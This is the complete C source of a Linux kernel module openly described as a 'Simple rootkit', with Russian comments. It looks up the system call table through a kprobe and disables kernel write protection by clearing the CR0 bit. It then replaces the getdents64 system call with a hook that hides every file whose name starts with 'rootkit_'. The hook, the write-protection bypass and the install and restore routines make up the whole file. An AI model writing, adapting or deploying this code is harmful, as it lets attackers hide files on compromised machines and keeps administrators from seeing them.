#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <asm/special_insns.h>

static unsigned long *sys_call_table;

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed for %s with ret %d\n", name, ret);
        return 0;
    }

    kallsyms_lookup_name_t kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    unsigned long sys_call_table = kallsyms_lookup_name_ptr(name);
    if (!sys_call_table) {
        pr_err("kallsyms_lookup_name failed for %s with ret %d\n", name, ret);
        return 0;
    }

    return sys_call_table;
}

/* Тип оригинального обработчика */
typedef asmlinkage long (*orig_getdents64_t)(
    const struct pt_regs *regs);

static orig_getdents64_t orig_getdents64;

/* Префикс для скрываемых файлов */
#define HIDE_PREFIX "rootkit_"

asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *current_dir, *prev_dir = NULL;
    struct linux_dirent64 *kdirent;
    long ret;
    unsigned long offset = 0;

    /* Вызываем оригинальный обработчик */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    /* regs->si == rsi на x86_64; в ядрах 6.1+ поле может называться иначе -
       проверьте arch/x86/include/asm/ptrace.h для вашей версии */
    dirent = (struct linux_dirent64 __user *)regs->si;

    /* Копируем результат в kernel space для модификации */
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    /* Итерируем по записям, удаляя скрываемые */
    current_dir = kdirent;
    while (offset < ret) {
        pr_info("%s\n", current_dir->d_name);
        if (strncmp(current_dir->d_name, HIDE_PREFIX,
                     strlen(HIDE_PREFIX)) == 0) {
            /* Сдвигаем оставшиеся записи поверх текущей */
            long reclen = current_dir->d_reclen;
            memmove(current_dir,
                    (char *)current_dir + reclen,
                    ret - offset - reclen);
            ret -= reclen;
            continue;
        }
        offset += current_dir->d_reclen;
        prev_dir = current_dir;
        current_dir = (void *)current_dir + current_dir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return ret; /* fallback: оригинальный результат уже в userspace от первого вызова */
    }
    kfree(kdirent);
    return ret;
}

// #define X86_CR0_WP_MASK (1UL << 16)

// static void print_cr0_wp(const char *where)
// {
//     unsigned long cr0 = read_cr0();

//     pr_info("%s: CR0 = 0x%lx, WP = %lu\n",
//             where,
//             cr0,
//             !!(cr0 & X86_CR0_WP_MASK));
// }


// static inline void cr0_write_unlock(void)
// {
//     unsigned long cr0 = read_cr0();
//     clear_bit(16, &cr0);
//     write_cr0(cr0);
// }

// static inline void cr0_write_lock(void)
// {
//     unsigned long cr0 = read_cr0();
//     set_bit(16, &cr0);
//     write_cr0(cr0);
// }

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : "+r"(val) : : "memory");
}

static int __init rootkit_init(void)
{
    sys_call_table = (unsigned long *)lookup_name("sys_call_table");
    if (!sys_call_table)
        return -ENXIO;

    pr_info("sys_call_table address: %px\n", sys_call_table);
    pr_info("__NR_getdents64 = %d\n", __NR_getdents64);

    // Сохраняем оригинал
    orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
    pr_info("Original getdents64: %px\n", orig_getdents64);
    pr_info("Hook function address: %px\n", hooked_getdents64);

    // Отключаем защиту от записи
    write_cr0_forced(read_cr0() & ~0x10000);

    // Записываем хук
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;

    // Включаем защиту обратно
    write_cr0_forced(read_cr0() | 0x10000);

    // ЧИТАЕМ ОБРАТНО и проверяем
    unsigned long new_entry = sys_call_table[__NR_getdents64];
    pr_info("After write, table[%d] = %px\n", __NR_getdents64, (void *)new_entry);

    if (new_entry == (unsigned long)hooked_getdents64)
        pr_info("Hook SUCCESSFULLY installed!\n");
    else
        pr_err("Hook FAILED! The entry still contains %px\n", (void *)new_entry);

    return 0;
}

static void __exit rootkit_exit(void)
{
    if (!sys_call_table || !orig_getdents64) {
        pr_warn("rootkit: nothing to restore\n");
        return;
    }

    if ((void *)sys_call_table[__NR_getdents64] != (void *)hooked_getdents64) {
        pr_warn("rootkit: getdents64 is not hooked by this module, not restoring\n");
        return;
    }

    pr_info("rootkit: restoring getdents64\n");

    write_cr0_forced(read_cr0() & ~0x10000);
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    write_cr0_forced(read_cr0() | 0x10000);

    pr_info("rootkit: restored getdents64 to %px\n", orig_getdents64);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hacker");
MODULE_DESCRIPTION("Simple rootkit");
